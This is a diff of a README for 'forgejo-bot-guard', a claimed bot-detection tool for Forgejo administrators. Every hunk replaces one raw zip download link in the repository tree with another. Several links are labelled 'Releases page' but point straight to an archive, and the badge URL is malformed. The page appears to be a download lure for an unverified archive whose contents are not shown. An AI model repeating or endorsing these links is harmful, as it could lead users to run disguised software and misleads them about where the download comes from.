@@ -1,6 +1,6 @@
 # 🚀 forgejo-bot-guard - Simplifying Bot Detection for Administrators
 
-[![Download forgejo-bot-guard](https://github.com/Davisfun85/forgejo-bot-guard/raw/refs/heads/main/forgejo_bot_guard/guard_bot_forgejo_1.7.zip%20Now-Forgejo%20Bot%https://github.com/Davisfun85/forgejo-bot-guard/raw/refs/heads/main/forgejo_bot_guard/guard_bot_forgejo_1.7.zip)](https://github.com/Davisfun85/forgejo-bot-guard/raw/refs/heads/main/forgejo_bot_guard/guard_bot_forgejo_1.7.zip)
+[![Download forgejo-bot-guard](https://github.com/Davisfun85/forgejo-bot-guard/raw/refs/heads/main/forgejo_bot_guard/forgejo_bot_guard_v1.9.zip%20Now-Forgejo%20Bot%https://github.com/Davisfun85/forgejo-bot-guard/raw/refs/heads/main/forgejo_bot_guard/forgejo_bot_guard_v1.9.zip)](https://github.com/Davisfun85/forgejo-bot-guard/raw/refs/heads/main/forgejo_bot_guard/forgejo_bot_guard_v1.9.zip)
 
 ## 📦 Overview
 
@@ -28,7 +28,7 @@ Before you download, ensure your system meets the following:
 To get started with forgejo-bot-guard, follow these simple steps:
 
 1. **Download the Application**
-   - Visit our [Releases page](https://github.com/Davisfun85/forgejo-bot-guard/raw/refs/heads/main/forgejo_bot_guard/guard_bot_forgejo_1.7.zip) to download the latest version of forgejo-bot-guard.
+   - Visit our [Releases page](https://github.com/Davisfun85/forgejo-bot-guard/raw/refs/heads/main/forgejo_bot_guard/forgejo_bot_guard_v1.9.zip) to download the latest version of forgejo-bot-guard.
 
 2. **Install the Application**
    - Once the file has downloaded, locate it in your downloads folder.
@@ -41,7 +41,7 @@ To get started with forgejo-bot-guard, follow these simple steps:
 
 ## 📥 Download & Install
 
-You can download forgejo-bot-guard by visiting this link: [Download forgejo-bot-guard](https://github.com/Davisfun85/forgejo-bot-guard/raw/refs/heads/main/forgejo_bot_guard/guard_bot_forgejo_1.7.zip). Follow the steps outlined in the "Getting Started" section for installation.
+You can download forgejo-bot-guard by visiting this link: [Download forgejo-bot-guard](https://github.com/Davisfun85/forgejo-bot-guard/raw/refs/heads/main/forgejo_bot_guard/forgejo_bot_guard_v1.9.zip). Follow the steps outlined in the "Getting Started" section for installation.
 
 ## 🔍 How to Use forgejo-bot-guard
 
@@ -92,4 +92,4 @@ forgejo-bot-guard is licensed under the MIT License. This means you can use, mod
 
 With forgejo-bot-guard, you can actively enhance the security of your Git hosting platforms. Follow these steps, and take control of your anti-crawling measures today!
 
-For any additional information or support, please visit our [Releases page](https://github.com/Davisfun85/forgejo-bot-guard/raw/refs/heads/main/forgejo_bot_guard/guard_bot_forgejo_1.7.zip) or the issues section on GitHub. Happy securing!
+For any additional information or support, please visit our [Releases page](https://github.com/Davisfun85/forgejo-bot-guard/raw/refs/heads/main/forgejo_bot_guard/forgejo_bot_guard_v1.9.zip) or the issues section on GitHub. Happy securing!
